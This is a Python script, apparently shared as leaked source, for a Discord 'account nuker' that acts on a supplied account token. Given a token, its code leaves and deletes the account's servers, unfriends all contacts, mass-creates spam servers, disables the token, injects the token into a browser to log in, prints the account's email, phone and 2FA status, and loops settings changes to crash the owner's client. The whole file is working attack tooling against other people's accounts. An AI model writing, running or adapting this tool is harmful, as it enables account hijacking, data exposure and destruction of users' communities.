import discord, asyncio, codecs, sys, io, random, threading, requests, discord, os
from discord.ext import commands
from discord.ext.commands import Bot
import pyfiglet
from pyfiglet import Figlet
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
init(convert=True)
bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command('help')
os.system('title 𝖌𝖗𝖚𝖉𝖌𝖊')
print(f"\n\n{Fore.CYAN}┍━━━━━━━━━━━━━━━━━━━{Fore.BLUE}━━━━━━━━━━━━━━━━━┑\n          {Fore.BLUE}╔═╗╦═╗╦ ╦╔╦╗╔═╗╔═╗\n          {Fore.CYAN}║ ╦╠╦╝║ ║ ║║║ ╦║╣  \n          {Fore.WHITE}╚═╝╩╚═╚═╝═╩╝╚═╝╚═╝\n          {Fore.BLUE}Account {Fore.CYAN}Nuker{Fore.WHITE}-> Bordo\n{Fore.CYAN}┕━━━━━━━━━━━━━━━━━━{Fore.BLUE}━━━━━━━━━━━━━━━━━━┙\n")
print('\n')
print(f"{Fore.LIGHTWHITE_EX}Token grabber removed :) | Fucked by PushyGamertag27")
print(f"{Fore.LIGHTWHITE_EX}have fun with source code skidders ;))\n")
token = input(f"{Fore.CYAN}Enter token{Fore.BLUE} To Start-> ")
head = {'Authorization': str(token)}
print('\n')
print(f"{Fore.CYAN}┍━━━━━━━━━━━━━━━━━━━{Fore.BLUE}━━━━━━━━━━━━━━━━━┑")
print(f"{Fore.LIGHTWHITE_EX}Token grabber removed :) | Fucked by pushygamertag27")
print(f"{Fore.LIGHTWHITE_EX}have fun with source code skidders ;))\n")
print(f"{Fore.LIGHTWHITE_EX}1 - kill + nukes everything")
print(f"{Fore.LIGHTWHITE_EX}2 - unfriend + unadds everybody")
print(f"{Fore.CYAN}3 - server bomb + leaves servers")
print(f"{Fore.CYAN}4 - mass server + spam servers")
print(f"{Fore.CYAN}5 - disable + disables the token")
print(f"{Fore.BLUE}6 - login + (work in progress)")
print(f"{Fore.BLUE}7 - info + token info")
print(f"{Fore.BLUE}8 - die + crashes whos on the token")
print(f"{Fore.BLUE}┕━━━━━━━━━━━━━━━━━━{Fore.CYAN}━━━━━━━━━━━━━━━━━━┙")
print('\n')

def nuke():
    print('Loading...')
    print('\n')

    @bot.event
    async def on_ready(times: int=100):
        print('starting-> [kill]')
        print('\n')
        print('1 - LEAVEING SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f"left from [{guild.name}]")
            except:
                print(f"CANT LEAVE [{guild.name}]")

        else:
            print('\n')
            print('2 - DELETING OWNED SERVERS')
            print('\n')
            for guild in bot.guilds:
                try:
                    await guild.delete()
                    print(f"[{guild.name}] have been deleted")
                except:
                    print(f"CANT delete [{guild.name}]")

            else:
                print('\n')
                print('3 - UNFRIENDING ALL FRIENDS')
                print('\n')
                for user in bot.user.friends:
                    try:
                        await user.remove_friend()
                        print(f"unfriended {user}")
                    except:
                        print(f"can't unfriend {user}")

                else:
                    print('\n')
                    print('4 - SPAMMING SERVERS')
                    print('\n')
                    for i in range(times):
                        await bot.create_guild('GRUDGE W', region=None, icon=None)
                        print(f"{i} server spammed")
                    else:
                        print('\n')
                        print('server limit reached')
                        print('\n')
                        print('\n')
                        print('5 - CRASHING DISCORD')
                        print('\n')
                        print('\n')
                        print('killing token users...')
                        print('dont close tool')
                        headers = {'Authorization': token}
                        modes = cycle(['light', 'dark'])
                        while True:
                            setting = {'theme':next(modes),
                             'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
                            requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)

    bot.run(token, bot=False)


def unfriender():
    print('starting..')

    @bot.event
    async def on_ready():
        print('starting-> [unfriend]')
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f"unfriended {user}")
            except:
                print(f"can't unfriend {user}")

        else:
            print('\n')
            print('[[completed.]')
            print('\n')

    bot.run(token, bot=False)


def leaver():
    print('Loading...')

    @bot.event
    async def on_ready():
        print('starting->[server bomb]')
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f"left from [{guild.name}]")
            except:
                print(f"deleting..[{guild.name}]")

        else:
            for guild in bot.guilds:
                try:
                    await guild.delete()
                    print(f"[{guild.name}] have been deleted")
                except:
                    print(f"CANT delete [{guild.name}]")

            else:
                print('\n')
                print('[[completed.]')
                print('\n')

    bot.run(token, bot=False)


def spamservers():
    print('Loading...')

    @bot.event
    async def on_ready(times: int=95):
        print('starting->[mass server]')
        for i in range(times):
            await bot.create_guild('GRUDGE W', region=None, icon=None)
            print(f"{i} slapped nerd")
        else:
            print('server limit reached')
            print('\n')
            print('[[completed.]')
            print('\n')
            input()

    bot.run(token, bot=False)


def tokenDisable(token):
    print('starting->[DISABLING TOKEN]')
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token})
    if r.status_code == 400:
        print(f"[{Fore.CYAN}+{Fore.RESET}]disabled token.")
        input('Press any key to exit...')
    else:
        print(f"[{Fore.BLUE}-{Fore.RESET}] Invalid token")
        input('Press any key to exit...')


def tokenLogin(token):
    print('starting->[LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option('detach', True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }\n            '
    driver.get('https://discord.com/login')
    driver.execute_script(script + f'\nlogin("{token}")')


def tokenInfo(token):
    print('starting->[TOKEN INFO]')
    headers = {'Authorization':token,  'Content-Type':'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f"\n            [{Fore.CYAN}User ID{Fore.RESET}]         {userID}\n            [{Fore.CYAN}User Name{Fore.RESET}]       {userName}\n            [{Fore.CYAN}2 Factor{Fore.RESET}]        {mfa}\n            [{Fore.BLUE}Email{Fore.RESET}]           {email}\n            [{Fore.BLUE}Phone number{Fore.RESET}]    {phone if phone else ''}\n            [{Fore.BLUE}Token{Fore.RESET}]           {token}\n            ")
        input()


def crashdiscord(token):
    print('starting->[die]')
    print('\n')
    print('crashing token users...')
    print('dont close..')
    headers = {'Authorization': token}
    modes = cycle(['light', 'dark'])
    while True:
        setting = {'theme':next(modes),
         'locale':random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch('https://discord.com/api/v6/users/@me/settings', headers=headers, json=setting)


def mainanswer():
    answer = input('Choose : ')
    if answer == '1':
        nuke()
    else:
        if answer == '2':
            unfriender()
        else:
            if answer == '3':
                leaver()
            else:
                if answer == '4':
                    spamservers()
                else:
                    if answer == '5':
                        tokenDisable(token)
                    else:
                        if answer == '6':
                            tokenLogin(token)
                        else:
                            if answer == '7':
                                tokenInfo(token)
                            else:
                                if answer == '8':
                                    crashdiscord(token)
                                else:
                                    print('Thats Not a Number Jamook Try Again')
                                    mainanswer()


mainanswer()